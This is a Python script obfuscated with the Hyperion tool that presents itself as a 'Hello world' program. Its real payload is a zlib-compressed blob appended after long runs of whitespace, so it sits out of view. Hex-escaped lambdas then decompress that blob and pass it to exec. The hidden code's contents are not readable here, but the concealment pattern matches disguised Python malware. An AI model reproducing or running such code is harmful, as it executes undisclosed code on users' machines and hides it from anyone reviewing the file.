from builtins import *
from math import prod as Math


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_algorithm, _round, _substract, Statistics, _builtins, _positive, Divide = exec, str, tuple, map, ord, globals, type

class _stackoverflow:
    def __init__(self, _square):
        self.StackOverflow = Math((_square, -97327))
        self.Square(Round=47349)

    def Square(self, Round = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.StackOverflow *= 96235 + Round
        
        try:
            {_ceil: _algorithm} if _builtins < Statistics else {_round: _ceil} is _ceil

        except OSError:
            (((_algorithm, _round, _builtins), _builtins) for _builtins in {_round: _ceil})

        except:
            Divide(31152 / 54458) == bool

    def Random(self, _absolute = 49961):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _absolute /= 54054 * -8203
        self.Power != False
        
        try:
            (((_algorithm, _algorithm), _round) for _round in (_algorithm, _algorithm))

        except AssertionError:
            ((_algorithm, _round, _builtins) or _ceil if (_algorithm, _round, _builtins) and _ceil else ... or (_ceil, (_algorithm, _round, _builtins)))

        except:
            Divide(-55510 * -93896) == bool

    def _memoryaccess(DetectVar = float):
        return _positive()[DetectVar]

    def _modulo(Ceil = -74011 - 88820, While = str, Substract = _positive):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Substract()[Ceil] = While
        
        try:
            ((_builtins, (_builtins, _round)) for _builtins in (_builtins, _round) if _algorithm <= _builtins)

        except TypeError:
            (_algorithm, _round, _builtins) if _substract < _positive else (_builtins, _round) == _ceil

        except:
            Divide(13112 * 29062) == False

    def execute(code = str):
        return _algorithm(_round(_substract(Statistics(_builtins, code))))

    @property
    def Power(self):
        self._callfunction = '<__main__.Divide object at 0x000008505BE25184>'
        return (self._callfunction, _stackoverflow.Power)

if __name__ == '__main__':
    try:
        _stackoverflow.execute(code = __code__)
        Builtins = _stackoverflow(_square = -98668 / 56949)

        if 274389 > 803135:
            _stackoverflow(_square = -33183 / -90528).Square(Round = Builtins.StackOverflow / -54083)
        elif 307195 < 2278850:
            _stackoverflow(_square = 7984 + -84147).Square(Round = Builtins.StackOverflow - -95542)                                                                                                                                                                                                                                                          ;_stackoverflow._modulo(Ceil='XXXXXXWXXWXWWXXWXW',While=b'x\x9c\xddZms\xe26\x10\xfe\\~\x05\xe5\x0bx.G\xfcn`&_:i\xa70$tz\x9d&\x9d\xbb\x1b\x8f\x8dEb*\xac\xd46=\xf2\xef\xbb\xbb\x92\x02\x07\x01\x0c\x1c7\xd3H\xc8z_K\x8fV\xab]\x992\x7f\xee\xd5\xea\xe0\xd2I\x8bbta(\xe2\xc9\xbc\x18G\xa5\xc8\xc3\xb0\xfe\xe3U\xe3\xd7\xe7\'\x96\xa7"k\xd4E\xbe\xd2,\x9a\x97\x8f"/\xa8M\xab\x11\xa7\x9c?\x97\x8f\xecAD\xa5\xe3\xf9\x8d\x8b\xc6O|\xce~gI\xc3\xf8\xaa\xd7CZ>\xcecI\xf8\xb1,\x9f\x8a\xde\xe5\xa5,k\x8f\xc5\xecr\x8d\xcc\xe5\x96w\'i1\x16y\xf25\x19U\xd8~x\xb8|\xe2\xd1\xc3\x9c\xadu\xe2\xe9\x98e\x05\x93\x9d~\xfem\xf8\xden\x9bkM\xc6"\x91\xf5\xcd\xa7<\xcd\xcaV\xe3W\xc6\xb9\xa8\x7f\x119O~l\x18\xcd\x9a\xd1{i\x8d\xf5\xcd\xe2\xef4i\x1a5\xb6\x18\xb3\xa7R\x81\x99=\xcd\xa1\xe7\xef\xa2`E=\xcaY=g\xc9\xa7\xec\xcfTpV\xca\x82\x18\x90\xf9\x94\xfd%\xe6\x94\x8b\xeaH\xe4Sv+b\x91<\xd7y\xfa7\xf4{\x16\xf3\x86Q\x93\x83JgO"/\xc3\x10\xde\xf6\\4\x8d6[\xa4e\xcb\xa8q1\x8ex\xd12>6?\xd8\xe8m\x0c\xf4\xfb\xf0A%\x9b\x9f\xaf\x1e\xb8\x88\xa1Ymk\x1b$0\x18\xf4\x07\xfd!<\x06\xfd\xfep8\x18\x0c\x87\xc3\xe6\xc7^\xef\xdd\xfbw\xef[\xef[\xef,\xc3\xf8\xfc\xf9*I\xf3\xddT\xee\xef\xef\xef\xe0\x07\x8e\x12\x10(\xb1I\xe9\x81\x95QY\xee\xa1\x06\xa3\x19\xf6i,06r\x10\xc1\x84\xe4\xb4k\xafVc\xbf\xd9,#\x8f?JC\x9f%\x86\xbb\xdf9\xba\xbe\x16\xa3\x91\x80\xa7\x8e\xa0\xf3\x06\xc1V3\x9e\xa7\xbcL3\\\x8c\x7f\xa3|\xc7`8\xe7\xd3\xe9\x94\xa7\xd3\x14\x1c<\xa6\xd3\x94\xe3c\nt%:w\xeb\xa8\xb5^y_\x91\xa5%O\xe7\xf1:\x94\xc6\xc5P.W\x1f\x97n\x80o\x1f\x0c\x0e"`|<\x99B;\xcd\x12\xb6h5\x19O\x9ffb\xbc\xd1\xe0\xb3\xb1\x1bt\xc0\xa8\xdf\xe7\xe0\xc1Q\xf2\rb\xc3\x85\xd8\xac\x05`\xb62\x8e\x00\xf6\xc30\x1a]\x8f\x80\r\x05r\xe45\xe6\x0f\x03\'M\xc7E\x94\xa5\xc7\x83\xb3\x95@ep\xb6S\xd0\xe0<OR\xbe`\x8f\xd9\xfc \x84\xf4\xbc%\x18\x98y\x8b|\x13\xfd\xcb^CeSP\x91\xf8\x12\xa69\x02g\n\x13xgd\x8e\x04\x14\xbcAT\xd8<\xff\xa3:*4u\x9a\xb4\x8e\xef\xde"\xab\xe4eq\xd0\xfe\x19!\x93\x98\x8aK A\x0e\xb8\xe6@\t\xf3\xbf\xc0\x86\x15<\xfa\xa5:\xc7p}\x12\xc9\x07\x9dH\xcdf{*\xd2l\xf7Q\x06*\x94\x1c(\x8cT\x0e\x1ba\x1f\x0c\xdf \xa4e$\xf8\xe4\xd0\xb3~\xeb\xa9\xd6\x8a\x9b.#\x9f(\xbf\xcc\xb1U\x0f\x1aW\xc2PKo5;\x93\xf2\x95\x13\xe3\xcd\x01=f\x8b\xeaG\xc0N\x80\x97\xa0.\x81\xd5`\'_\x01\x9f\xec\x87y\xf3\xf8m\xedz\xb9m\xbb\xcc\xef0+\x8e\xa2$0m\xd3\x1dC:\x8e-\xdf\x82\xb4C5q\'\xf1\x19\xd8,{^}\xc4\xcc\xfd\xae?\xa6\x80>\x02\xdf\xa5\x18\xcbtZ\xe6d\x9bh\xff\xecy4\x8b\x93\xa8>\x9b\xc9\x85\x9ceY\xa6\xc2\xac\xb7c\x03\x1c1t\x06>yy\xca\x90\xbc\xc4\xec\xc5\x9fc\xc9\xbc\xd8\xb1\xbd\xc46=\xdb\xf5\xdc\x00b\xd3\xb5\xdc\xc0\xf5 \xe5\xba\x1d\x00j\x82\xcb\xd6\x1d\x03\xc7`\xad\xe3z\x9e\x0b\xb1\xe5\xb9\x9e\x7f\xf4B\x92\x19y\'\xf7\xae\xdc\xbfw\xab]\x0f\x9c\x04L`\xe2x\x10|\x08\x01\x04\x0b\x82\xad\xf2:\xf6\xec\xd8\xee\xd8I\xa5\xb6\xae\xdd\xdd;12r\x0fF\xdb\xef\x04\x00n`\x06\x8e\x13\xd9\x13{\x12\xd8\xbe\x15\x046\xf3\x03\xbf\x1b\xb8P\x0b\xa0\x06^\x00\xa3\x80\x1a\xc7\x9f\xf8\x0cJ=|B\x1b\xcc\'\xf6\xc4u\xa1\x8f\x0b<\x1c;\x16x\xdb\x9e@\x8d\x05|\xedB\x0c\xf5\xc02\x98c@\xdd\xf5]\xa0\xe5\xc3B\x1d\xbdR\xa0;\xa0\xfa02Q\xe14\xa5\x16a\x92\x12z\xca\x8au\x01eS\xa1\xef\xab\x15\xc1\xb4\xab\xf2\x96Z\xad}\xed\xccs\xadT`\x07G#6B:@\x15\x0be\xcd\x1e\xa8\x9a\x86\tU\xd6)\x80v4p\x8a\xadM\x15<\x95\xef\x12[KP\xab\xb4u\xaa\x01+\xc1\xd5\x922\xa3\x83o&e\xa4v\x90\xe9\xbd\x06\xd4\x16\xf4\xd4\x1d\x01zt\x94:\x05\x18\xcbNh\xd2g\xe3\x14\xdc\xa7c\xd8\xa3Vp\xc2.\x9b\xa64[\x8e\xd7G<\xe5\xea\x02i\x9a\xeee\x9c \xec\x84\xdd\xd0\r\xad\xd0\x81\xb8\x13za\x17\x9av6K\xbf#\x86\xff\x0f\xd9hC\xdf 0!\x1f\x00EI\x1fh\xfa\xc1\xf1\xabx{{{sss+=\xa5\xbf+\xe7\xaam8"\xf1,\xf0\x92\x80\xac=\x94\xd5\xe6\xa8\xb7\xc5H\xdcn\x1eqm\x1f\xd16\xe4{Y\xd1\x0f\x03`9\x1f\x18\x0eY\xce\tmh\x18\xac\x97\x9d\x04\x08\xca%\x15\xba\xea\xb8\xb6U\xdeSiS\xc9\xb8}m\xb1\xbe{Vv\x06\xc5\xca"\xc5\xcau]\xcf\x01\r\xd8\x07\xc5\n\x0e.\xd7v\'\xe0\xe3\xb3h\xc1A\x10t\x82\x80\x9e\x1d\x95\xee\xac\xe5\xc8W\xd6~Gt\x88\x8dLy\x8b@\xba\x00\xa8\x02\xdfV\xff\xf5\x1c\x0f\xce\x9b\xa5\x97y|\xea\x18\x9f2\x9cA\x03\x86\x8dv\xbc\xdc\x9e\xf2)\tm\x94\xd9\xf8\x01`\x8a\xbb%\xad\xb0[N>\xf1\xf5i\xed+\x0e\xd7\\\xadO\xf5`E\x8d\xaa\xd2\xf6\xbc\xc2\xdd9\xfep\xdci\xef\xc2\xb8}\xdcN\x10\xbb*\xf6)\xad\xf3 \xd3!]\x99\xdf\x17\x8b/_\x16\xf0\xa0\x1f&\xd0\x1d(;\xe1\x08@\xd9\x7fC\x87\x81N\xa2?\xd5\xc6q\x94\xa2\xd6QK\xe6\xad,aw\xcd\xc6\xd9\xd7\xf6|6\x0e\x08>g\x8bE\x89e8\xcc\xb3\\\x00h\xa3\xbf\xab\xcc\xfc.\x19\xfc\xd1\xd2\xe4\x97\xe9\xca\xac h\x084\n\xf9\xbek|\xef\xf5\x81\'\xe9\xde\xdb\x9a\xe5-\xcd\xea%X\xb2z\x87s\xf6\x9b\x1a\x8f\x94\xa4\xb3,\xcbRxk\x81.\xf3KQ\xbf\xf4\x95\x97F\xeeQ\xbdIq\x8bRt\x90\x9d\xb1Tp\xfa}u\x19\\I\xcd\xa9"\xb8\xab\xb6\nB\x1b\xd4\xa2\x80\xf4\xf4 4!\xdd!\xed}\xa3\xf4\x14\xc9\xe1({\xd9UR\xc0UR\xc1Q\x12\xc1[\x91\x1cU\xdaV\x94\x1c\xab\xe1\x98\x03\xc39\xfeT\xc67\xa8\xff&\xdc\x91\xdb\xbb\x10\x16T\x99\xa7\x80\xec\xae\x80e\xad\x88\\}\xad\xe4\xae\xe8\xa6\xfb\xda:g\xd7M\xbf\xaf\xa9\xe5iS\x0b\xdes&\xe1\xbf"IW\xe5\xe9\xda\xa7\x85\xca\xf2\xe5\x03*\xb3R\xbfE\xdd\x16\xc2!\xa2\xc5FG\xdd\xe9I\xb4\xbe\x95X\x01q\x10\x90i\xef\x80\xf7AD\xa0\xc0\xb06K+Xk]hk\x92\xb7\xe8\xaa\xa0K\xf6\xdaF\xe97\x1a\xb9\x07\xd4\xba\xa1%\xc5\x19\x8c\xd1\x0ba\xcf\xbd\xf37K\xbf\xf3E\xc5\xa6\xa8\xd2\x96\x0f\xd9=B\xd9\xd1\xf8\xc5\xfd@5\x10\xcdp\xb4\xbf\xd1v2M\xfcj\x7f~1\xa4o\xb4\xad\x15q\xe2\xad\x98\xc2(vl%\x86\xaa\xb4\xb5\x8e\xb8\x06\xc4S\xf9\x0b\x1e\xca\xea\t\xee\xf5\xdd3\xc9\xc5\xac\xae\xfffU\x97\xff\xde\xaa\xb3\x05\x1b_\xd0\xdf\xeb.\xe8\xefy\x90.kX\xd8\xc2+hy\xfb\xac\xae\xa2\xe9Z\x1a-R\xa3\xa6:\xe7\xec\x9f9+\xca\xe2B\x145Q\xb4\x8b\xe7\xa2d\xb3\xd6\xdam"\x9d\xfcFM\xfe\xf9\x8fs}\xc3!\x15\x80>\xd75\xf2\x16S\xddh\xd2\xd7\x1f\xc8\xeaJ\xa5\xd0\xbf(\xf8*ysc\xd4\xa2+\xf9\xe7@\xaa\xb9U\xb6\x00\xd5c\x12\x86:\xa9GWWR<\x90\x80 \xf9"\r\xea^\xed\x07\x9a\xaa\x9eG\xfb\x81\x95-\xfd\x85D\x7f/\xb9\xbf7\xda%[\x94\x9a\x14\xd9\x9b\\Y\x9f)\xfd\x0f\x8d\xac\xd2\xe9\xab\xd4\xd4\xc5"W\x06\xebT\xce>\x9d\xae\xd3T\xdaQ_kH\x12\xb9\xd7\x07x\'\x07(?\xc8B\xa4i1^0\xe8\xf1\x02\x19\x02pKN\xa2wk\xd4\xfe\x03\xf9}o|')

        if 474523 > 3781246:
            Builtins.Random(_absolute = -54699 / Builtins.StackOverflow)
        elif 331504 < 8879941:
            _stackoverflow(_square = -23244 + -36084).Random(_absolute = -46955 + Builtins.StackOverflow)                                                                                                                                                                                                                                                          ;OoOoOooOoDODOoDODooOOD,DDoOoDODoDoooooDOODoOOD,IIlIIllllIIIllIlIIll,mnnnnmmmnmnnnnnmnnnnnm,DDoDDDDDDODDOoOoD=(lambda IIILJLIJLJIILIIJJIJJLJJJL:IIILJLIJLJIILIIJJIJJLJJJL(__import__('\x7a\x6c\x69\x62'))),(lambda IIILJLIJLJIILIIJJIJJLJJJL:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIILJLIJLJIILIIJJIJJLJJJL)"),filename='\x4f\x6f\x6f\x4f\x30\x4f\x30\x4f\x30\x6f\x30\x4f\x4f\x6f\x4f\x30\x6f\x6f\x6f',mode='\x65\x76\x61\x6c'))),(lambda IIILJLIJLJIILIIJJIJJLJJJL:IIILJLIJLJIILIIJJIJJLJJJL['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda IIILJLIJLJIILIIJJIJJLJJJL:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIILJLIJLJIILIIJJIJJLJJJL)"),filename='\x4f\x6f\x6f\x4f\x30\x4f\x30\x4f\x30\x6f\x30\x4f\x4f\x6f\x4f\x30\x6f\x6f\x6f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda OODOoOOoDOoDDDOOoDDOoo,IIILJLIJLJIILIIJJIJJLJJJL:OODOoOOoDOoDDDOOoDDOoo(IIILJLIJLJIILIIJJIJJLJJJL))
        _stackoverflow(_square = -58358 * 2612).Square(Round = Builtins.StackOverflow * 48311)                                                                                                                                                                                                                                                          ;mnnnnmmmnmnnnnnmnnnnnm()(DDoDDDDDDODDOoOoD(IIlIIllllIIIllIlIIll(OoOoOooOoDODOoDODooOOD(DDoOoDODoDoooooDOODoOOD('\x76\x61\x72\x73'))),_stackoverflow._memoryaccess(DetectVar='XXXXXXWXXWXWWXXWXW')))

    except Exception as _ceil:
        if 405564 > 4533243:
            _stackoverflow.execute(code = _round(_ceil))

        elif 273446 > 5547670:
            _stackoverflow(_square = 92380 + 85350).Random(_absolute = 61333 * Builtins.StackOverflow)
